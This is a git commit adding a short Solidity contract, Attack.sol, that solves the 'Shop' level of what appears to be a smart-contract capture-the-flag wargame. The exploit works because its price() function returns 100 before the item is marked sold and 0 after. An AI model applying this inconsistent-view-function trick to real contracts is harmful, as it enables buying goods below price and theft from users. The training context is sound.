8cbad81671c74685e2bb6580a466d388e8b90c25
0xgtim <99255480+timou0911@users.noreply.github.com>
2024-12-21 15:41:47 +0800

    Update Attack.sol

--- 21. Shop ★★☆☆☆/Attack.sol
+++ 21. Shop ★★☆☆☆/Attack.sol
@@ -1,1 +1,19 @@
+// SPDX-License-Identifier: MIT
 
+pragma solidity ^0.8.0;
+
+contract Attack is Buyer {
+    Shop target;
+
+    constructor(address targetAddr) {
+        target = Shop(targetAddr);
+    }
+
+    function price() public view override returns (uint256) {
+        return target.isSold() ? 0: 100;
+    }
+
+    function attack() public {
+        target.buy();
+    }
+}
